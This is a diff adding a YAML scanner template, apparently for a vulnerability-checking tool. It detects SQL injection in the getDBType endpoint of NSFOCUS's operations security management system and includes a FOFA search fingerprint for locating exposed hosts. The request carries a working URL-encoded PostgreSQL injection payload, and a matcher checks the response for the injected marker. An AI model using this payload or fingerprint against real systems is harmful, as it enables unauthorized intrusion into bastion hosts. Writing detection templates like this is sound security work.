@@ -1,0 +1,25 @@
+id: nsfocus-getdbtype-sqli
+
+info:
+  name: 绿盟运维安全管理系统 getDBType 接口SQL注入
+  author: zan8in
+  severity: high
+  verified: true
+  description: |-
+    绿盟运维安全管理系统 getDBType 接口SQL注入漏洞
+    fofa: body="'/needUsbkey.php?username='"
+  reference:
+    - https://peiqi.wgpsec.org/wiki/webapp/绿盟/绿盟%20SAS堡垒机%20getDBType%20远程命令执行漏洞.html
+  tags: nsfocus,rce
+  created: 2026/01/09
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /webconf/log/getDBType?cat=espc&sid=7473a85e535405e7bd991cb82b2f134c&sql=(SELECT+(CHR(113)%7C%7CCHR(122)%7C%7CCHR(122)%7C%7CCHR(107)%7C%7CCHR(113))%7C%7C(SELECT+(CASE+WHEN+(3788%3D3788)+THEN+1+ELSE+0+END))%3A%3Atext%7C%7C(CHR(113)%7C%7CCHR(112)%7C%7CCHR(112)%7C%7CCHR(113)%7C%7CCHR(113)))
+    expression: |
+      response.status == 200 &&
+      response.headers['content-type'].icontains("text/html") &&
+      response.body.bcontains(b'<dbtype>qzzkq1qppqq</dbtype>')
+expression: r0()
